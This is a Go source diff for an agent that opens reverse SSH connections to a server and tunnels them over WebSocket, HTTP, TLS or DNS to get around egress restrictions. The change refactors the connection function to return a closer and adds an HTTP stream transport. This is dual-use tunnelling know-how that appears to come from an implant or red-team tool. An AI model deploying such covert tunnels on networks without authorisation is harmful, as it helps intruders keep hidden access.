@@ -1,8 +1,10 @@
 package ssh
 
 import (
+	"Goauld/agent/ssh/transport/http"
 	"context"
 	"fmt"
+	"io"
 	"net"
 	"strings"
 	"time"
@@ -18,7 +20,7 @@ import (
 // This client may be proxyfies (TLS, Websocket, HTTP), or not, depending
 // on the egress restrictions
 // The order of the connection attempt is defined in the agent configuration
-func getProxifiedClient(sshConfig *ssh.ClientConfig, ctx context.Context, dnsTransport *transport.DNSSH) (*ssh.Client, net.Conn, error) {
+func getProxifiedClient(sshConfig *ssh.ClientConfig, ctx context.Context, dnsTransport *transport.DNSSH) (*ssh.Client, net.Conn, io.Closer, error) {
 	var client *ssh.Client
 	var conn net.Conn
 	for _, proto := range config.Get().GetRsshOrder() {
@@ -26,35 +28,37 @@ func getProxifiedClient(sshConfig *ssh.ClientConfig, ctx context.Context, dnsTra
 		case strings.HasPrefix(proto, "ssh"):
 			client = directSSH(sshConfig)
 			if client != nil {
-				return client, nil, nil
+				return client, nil, client, nil
 			}
 
 		case strings.HasPrefix(proto, "ws"):
 			client, conn = proxifyWS(sshConfig, ctx)
 			if client != nil {
-				return client, conn, nil
+				return client, conn, conn, nil
 			}
 		case strings.HasPrefix(proto, "http"):
-			client, conn = proxifyHttp(sshConfig)
+			c, ssHTTP := proxifyHttp(sshConfig)
+			client = c
+			conn = ssHTTP.Stream
 			if client != nil {
-				return client, conn, nil
+				return client, conn, ssHTTP, nil
 			}
 		case strings.HasPrefix(proto, "tls"):
 			client, conn = proxifyTls(sshConfig, ctx)
 			if client != nil {
-				return client, conn, nil
+				return client, conn, nil, nil
 			}
 		case strings.HasPrefix(proto, "dns"):
 			if dnsTransport != nil {
 				client, conn = proxifyDns(sshConfig, dnsTransport)
 				if client != nil {
-					return client, conn, nil
+					return client, conn, conn, nil
 				}
 			}
 		}
 	}
 
-	return nil, nil, fmt.Errorf("failed to Proxify ssh connection")
+	return nil, nil, nil, fmt.Errorf("failed to Proxify ssh connection")
 }
 
 // directSSH perform a direct ssh connection to the SSHD server
@@ -106,16 +110,21 @@ func proxifyWS(sshConfig *ssh.ClientConfig, ctx context.Context) (*ssh.Client, n
 }
 
 // proxifyTls proxifies the SSH traffic using a HTTP connection to the server
-func proxifyHttp(sshConfig *ssh.ClientConfig) (*ssh.Client, net.Conn) {
+func proxifyHttp(sshConfig *ssh.ClientConfig) (*ssh.Client, *http.SSHTTP) {
 	log.Info().Msg("Trying to proxify SSH using HTTP")
-	httpConn := transport.NewSSHTTPConn()
-	err := httpConn.Connect()
+	httpConn, err := http.NewSSHTTP(config.Get().SSHTTPUrl())
+	// err := httpConn.Connect()
+	if err != nil {
+		log.Error().Err(err).Msg("failed to proxify SSH using HTTP")
+		return nil, nil
+	}
+	_, err = httpConn.Stream.Write([]byte(config.Get().Id))
 	if err != nil {
 		log.Error().Err(err).Msg("failed to proxify SSH using HTTP")
 		return nil, nil
 	}
 	log.Debug().Msg("Connection succedded, trying to mount SSH over the HTTP connection")
-	client, err := tryProxifySsh(sshConfig, httpConn)
+	client, err := tryProxifySsh(sshConfig, httpConn.Stream)
 	if err != nil {
 		log.Error().Err(err).Msg("failed to proxify ssh connection using HTTP")
 		return nil, nil
